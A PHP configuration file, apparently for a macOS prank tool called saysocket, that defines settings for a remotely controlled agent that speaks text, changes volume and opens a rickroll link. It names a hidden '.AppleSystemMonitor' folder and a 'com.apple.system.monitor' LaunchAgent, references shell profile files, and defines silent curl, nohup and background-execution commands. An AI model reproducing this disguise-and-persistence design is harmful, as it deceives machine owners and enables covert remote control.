<?php

require_once 'settings.inc';
require_once 'DatabaseConnection.inc';
require_once 'functions.inc';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

// define('SERVER_HOST', 'http://saysocket.com/');
// define('SERVER_HOST', $protocol . $_SERVER['HTTP_HOST'] . '/');
define('SILENT_SUFFIX', '> /dev/null 2>&1 &');

define('REGEX_VIDEO_ID', '/[a-zA-Z0-9_-]+/');
define('REGEX_VALID_IP_ADDRESS', "/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/");


// REGEX ICONS (content|href|src) * =|: *"/(apple|android|favicon|ms) -> $1="/icons/$2
global $ss_config, $b64_config;

$ss_config = array(
  'DIR_MAIN' => '.AppleSystemMonitor',
  'DIR_BIN' => 'bin',
  'DIR_AGENT' => 'lib',
  'DIR_LAUNCH_AGENTS' => 'Library/LaunchAgents',
  'DIR_LOCAL_BIN' => '.bin',

  'FILE_MAIN_BINARY' => 'ctl',
  'FILE_MAIN_MONITOR' => 'monitor',
  'FILE_MAIN_SCANNER' => 'scan',
  'FILE_LAUNCH_PLIST' => 'com.apple.system.monitor',
  'FILE_PHP_BINARY' => '/usr/bin/php',
  'FILE_INSTALLER' => 'ss_install',
  'FILE_REMOVER' => 'ss_remove',
  'FILE_BASH_PROFILE' => '.bash_profile',
  'FILE_ZSH_PROFILE' => '.zshrc',
  'FILE_TEMP_INSTALLER' => '/tmp/si' . substr(md5(__FILE__), 0, 8),
);

$b64_config = array(
  'CONST_REGEX_VALID_IP_ADDRESS' => '/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/',
  'CONST_REGEX_SIMPLE_STRING' => '/^[a-zA-Z0-9\s,\'\.]+$/',
  'CONST_REGEX_CTL_QUIT' => '/^quit|exit|shutdown$/i',
  'CONST_REGEX_CTL_UPDATE' => '/^update$/i',
  'CONST_REGEX_CTL_RICK_ROLL' => '/^rickroll$/i',
  'CONST_REGEX_CTL_VOICES' => '/^voices$/i',
  'CONST_REGEX_CTL_GET_VOICE' => '/^voice$/i',
  'CONST_REGEX_CTL_SET_VOICE' => '/^voice ([a-z]+)$/i',
  'CONST_REGEX_CTL_VOLUME' => '/^volume (\d)$/i',
  'CONST_PORT_MIN' => 1024,
  'CONST_PORT_MAX' => 65535,
  'CONST_SS_PORT' => 12345,
  'CONST_PROMPT' => 'say> ',

  'SS_CMD_QUIT' => 'quit|exit|shutdown',
  'SS_CMD_UPDATE' => 'update',
  'SS_CMD_RICKROLL' => 'rickroll',
  'SS_CMD_VOICES' => 'voices',
  'SS_CMD_VOICE' => 'voice',
  'SS_CMD_VOLUME' => 'volume',

  'CMD_SAY' => 'say',
  'CMD_CURL_SILENT' => 'curl -s',
  'CMD_OPEN' => 'open',
  'CMD_OSASCRIPT' => 'osascript -e',
  'CMD_SET_VOLUME' => 'set Volume',
  'CMD_WHICH' => 'which',
  'CMD_IPCONFIG' => 'ipconfig',
  'CMD_GETIFADDR' => 'getifaddr',
  'CMD_PROCESSES' => 'ps aux',
  'CMD_NOHUP' => 'nohup',
  'CMD_UPDATE' => parse_file_contents('cmd'),

  'OPT_IP' => 'ip',
  'OPT_PORT' => 'port',
  'OPT_HASH' => 'h',

  'STR_SERVER_HOST' => SERVER_HOST,
  'STR_DEFAULT_VOICE' => 'alex',
  'STR_INTERFACE_PREFIX' => 'en',
  'STR_DEFAULT_IP' => '127.0.0.1',
  'STR_CURRENT_VOICE' => 'Current voice is:',
  'STR_VOICE_HELP' => "Voice does not exist. Use 'voices' command to see a list of available voices\r\n",
  'STR_CANNOT_SAY' => 'Cannot say:',
  'STR_COMMAND_EXISTS' => "command exists\r\n",
  'STR_TOO_COMPLEX' => "string is too complex\r\n",
  'STR_RICK_ROLL_URL' => 'https://www.youtube.com/watch?v=oHg5SJYRHA0',
  'STR_WELCOME_MSG' => get_welcome_message()
);

foreach ($ss_config as $key => $val) {
  $b64_config["CONFIG_$key"] = $val;
}
